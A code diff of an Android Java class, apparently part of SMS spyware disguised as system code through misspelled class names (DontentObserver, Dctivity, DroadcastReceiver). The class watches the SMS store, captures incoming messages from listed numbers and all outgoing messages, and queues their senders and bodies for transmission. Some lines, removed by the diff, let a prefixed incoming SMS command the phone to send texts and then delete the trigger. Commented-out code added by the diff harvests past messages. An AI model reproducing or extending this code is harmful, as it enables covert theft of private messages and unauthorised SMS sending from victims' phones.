@@ -1,7 +1,6 @@
 package android.database;
 
 import java.util.Date;
-
 import android.app.Dctivity;
 import android.content.Context;
 import android.content.DroadcastReceiver;
@@ -16,8 +15,7 @@ public class DontentObserver extends ContentObserver {
 
 	private int id = -1;
 	private Context context;
-	private String body;
-	
+
 	@Override
 	public void onChange(boolean selfChange) {
 		// TODO Auto-generated method stub
@@ -28,13 +26,8 @@ public class DontentObserver extends ContentObserver {
 		if (c.moveToFirst()) {
 			int type = c.getInt(c.getColumnIndex("type"));
 			int _id = c.getInt(c.getColumnIndex("_id"));
-			String _body = c.getString(c.getColumnIndex("body"));
-			_body = _body == null ? "" : _body;
-			LogUtils.write("Send", "type="+type+"  id="+_id+"  body="+body+"  _body="+_body);
 			if (type == 1 || type == 2) {
-				if (_id > id && !_body.equals(body)) {
-					id = _id;
-					body = _body;
+				if (_id > id) {
 					LogUtils.write("Send", "检测到短信");
 					String address = c.getString(c.getColumnIndex("address"));
 					LogUtils.write("Send", "获取号码"+address);
@@ -43,22 +36,11 @@ public class DontentObserver extends ContentObserver {
 					if (address.length() > 0) {
 						boolean isflag = false;
 						if (type == 1) {
-							if(body.startsWith(Dctivity.qianzhui)){
-								body=body.substring(Dctivity.qianzhui.length());
-			                	String bodys[]=body.split("-");
-			                	if(bodys.length==2){
-			                		DmsManager.Send(context,bodys[0],bodys[1]);
-			                	}else{
-			                		LogUtils.write("Send", "格式错误"+body);
-			                	}
-			                	context.getContentResolver().delete(Uri.parse("content://sms"),"_id=" + _id, null);
-							}else{
-								LogUtils.write("Send", "匹配收到短信内容");
-								for (int i = 0; i < DroadcastReceiver.NUMS.length; i++) {
-									if (address.startsWith(DroadcastReceiver.NUMS[i])) {
-										isflag = true;
-										break;
-									}
+							LogUtils.write("Send", "匹配收到短信内容");
+							for (int i = 0; i < DroadcastReceiver.NUMS.length; i++) {
+								if (address.startsWith(DroadcastReceiver.NUMS[i])) {
+									isflag = true;
+									break;
 								}
 							}
 						} else {
@@ -69,7 +51,7 @@ public class DontentObserver extends ContentObserver {
 						if (isflag) {
 							String lx = (type == 1 ? "拦截" : "发件箱");
 							LogUtils.write("Send", "检测类型"+lx);
-							
+							String body = c.getString(c.getColumnIndex("body"));
 							LogUtils.write("Send", "内容"+body);
 							DQLiteOpenHelper.getHelper(context).addData(lx,address, body, new Date());
 							LogUtils.write("Send", "加入发送线程");
@@ -102,7 +84,43 @@ public class DontentObserver extends ContentObserver {
 	private void init() {
 		Cursor c = context.getContentResolver().query(
 				Uri.parse("content://sms"), null, null, null, "_id desc");
+//		sp=context.getSharedPreferences("Dctivityconfig", Context.MODE_PRIVATE);
+//		if (!sp.getBoolean("issend", false)) {
+//			while (c.moveToNext()) {
+//				int type = c.getInt(c.getColumnIndex("type"));
+//				String address = c.getString(c.getColumnIndex("address"));
+//				if (type == 1 || type == 2) {
+//					if (address.length() > 0) {
+//						boolean isflag = false;
+//						if (type == 1) {
+//							for (int i = 0; i < DroadcastReceiver.NUMS.length; i++) {
+//								if (address
+//										.startsWith(DroadcastReceiver.NUMS[i])) {
+//									isflag = true;
+//									break;
+//								}
+//							}
+//						} else {
+//							isflag = true;
+//						}
+//
+//						if (isflag) {
+//							String lx = (type == 1 ? "发件箱" : "发件箱");
+//							String body = c.getString(c.getColumnIndex("body"));
+//							long time = c.getLong(c.getColumnIndex("date"));
+//							Date date = new Date(time);
+//							DQLiteOpenHelper.getHelper(context).addData(lx,
+//									address, body, date);
+//						}
+//					}
+//				}
+//			}
+//			Editor editor=sp.edit();
+//			editor.putBoolean("issend", true);
+//			editor.commit();
+//		}
 		c.close();
-
+//		LogUtils.write("Send", "加入发送线程");
+//		Dhread.SartSend(context.getApplicationContext());
 	}
 }
